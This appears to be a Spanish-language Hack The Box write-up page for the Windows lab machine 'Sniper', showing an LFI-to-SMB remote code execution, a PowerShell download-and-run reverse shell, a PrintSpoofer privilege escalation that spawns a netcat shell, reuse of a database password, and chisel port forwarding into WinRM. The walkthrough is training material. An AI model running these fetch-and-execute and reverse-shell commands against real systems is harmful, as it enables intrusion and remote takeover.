@@ -1,0 +1,140 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Sniper HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/sniper/pasted-20260323182009.png" alt="Sniper HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Sniper</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>impersonación</span>
+            <span>PrintSpoofer</span>
+            <span>lfi</span>
+            <span>port forwarding</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Aplicación web vulnerable a LFI</li>
+            <li><code>Explotación</code>: LFI hacia recurso SMB controlado para conseguir RCE</li>
+            <li><code>Movimiento lateral</code>: Credenciales en <code>db.php</code> y port forwarding hacia servicio interno</li>
+            <li><code>Escalada de Privilegios</code>: <code>SeImpersonatePrivilege</code> mediante PrintSpoofer</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/sniper/pasted-20260323182100.png" alt="Sniper HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <img class="writeup-image" src="/writeups/assets/sniper/pasted-20260323182209.png" alt="Sniper HTB" />
+          <img class="writeup-image" src="/writeups/assets/sniper/pasted-20260323182241.png" alt="Sniper HTB" />
+          <img class="writeup-image" src="/writeups/assets/sniper/pasted-20260323182429.png" alt="Sniper HTB" />
+          <div class="code-card">
+            <h3>Subir RCE</h3>
+            <pre><code># Kali 
+cp /usr/share/davtest/backdoors/php_cmd.php .
+impacket-smbserver SMB $(pwd) -smb2support -debug
+# LFI
+http://sniper/blog/?lang=\\10.10.16.69\SMB\php_cmd.php&amp;cmd=whoami</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/sniper/pasted-20260323234723.png" alt="Sniper HTB" />
+          <div class="code-card">
+            <h3>Reverse shell</h3>
+            <pre><code># Kali 
+cp ../windows_tools/Invoke-PowerShellTcp.ps1 .
+python -m http.server 80
+penelope -p 443
+# LFI
+http://sniper/blog/?lang=\\10.10.16.69\SMB\php_cmd.php&amp;cmd=PowerShell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.69/Invoke-PowerShellTcp.ps1')</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Impersonate</h2>
+          <div class="code-card">
+            <h3>Impersonate</h3>
+            <pre><code>cmd /c PrintSpoofer.exe -c "nc.exe 10.10.16.69 4443 -e cmd.exe"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/sniper/pasted-20260324001109.png" alt="Sniper HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Password Spray y port forwarding WINRM</h2>
+          <img class="writeup-image" src="/writeups/assets/sniper/pasted-20260324002153.png" alt="Sniper HTB" />
+          <div class="code-card">
+            <h3>Credenciales</h3>
+            <pre><code># Usuario: dbuser
+# Contraseña: 36mEAhz/B8xQ~2VM
+# BD_Namee: sniper
+cmd /c mysql.exe --user='dbuser' --password='36mEAhz/B8xQ~2VM' sniper -e 'show tables';
+# No Funciona</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Password Spray</h3>
+            <pre><code>nxc SMB sniper -u 'chris' -p '36mEAhz/B8xQ~2VM'</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/sniper/pasted-20260324004812.png" alt="Sniper HTB" />
+          <div class="code-card">
+            <h3>Grupos de Chris</h3>
+            <pre><code>net user chris
+# Remote Management users</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/sniper/pasted-20260324004901.png" alt="Sniper HTB" />
+          <div class="code-card">
+            <h3>Enumerar puertos abiertos</h3>
+            <pre><code>netstat -ano
+# 5985 Interno</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/sniper/pasted-20260324005014.png" alt="Sniper HTB" />
+          <div class="code-card">
+            <h3>Portforwarding</h3>
+            <pre><code># Kali
+chisel server -p 9090 --reverse --socks5
+# Windows
+\\10.10.16.69\SMB\chisel.exe client 10.10.16.69:9090 R:1080:socks R:85:127.0.0.1:5985 </code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Acceso WINRM</h3>
+            <pre><code>evil-winrm -i 10.10.16.69 -u chris -p '36mEAhz/B8xQ~2VM' -P 85</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/sniper/pasted-20260324005707.png" alt="Sniper HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Alternativa</h2>
+          <div class="code-card">
+            <h3>Windows PowerShell</h3>
+            <pre><code>$user = "Sniper\chris"
+$password = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential($user, $password)
+Invoke-Command -Credential $cred -ComputerName Sniper -ScriptBlock { whoami }
+# Reverse shell
+Invoke-Command -Credential $cred -ComputerName Sniper -ScriptBlock { \\10.10.16.69\SMB\nc.exe 10.10.16.69 443 -e cmd }</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/sniper/pasted-20260324012306.png" alt="Sniper HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>impersonación</span>
+            <span>PrintSpoofer</span>
+            <span>lfi</span>
+            <span>port forwarding</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
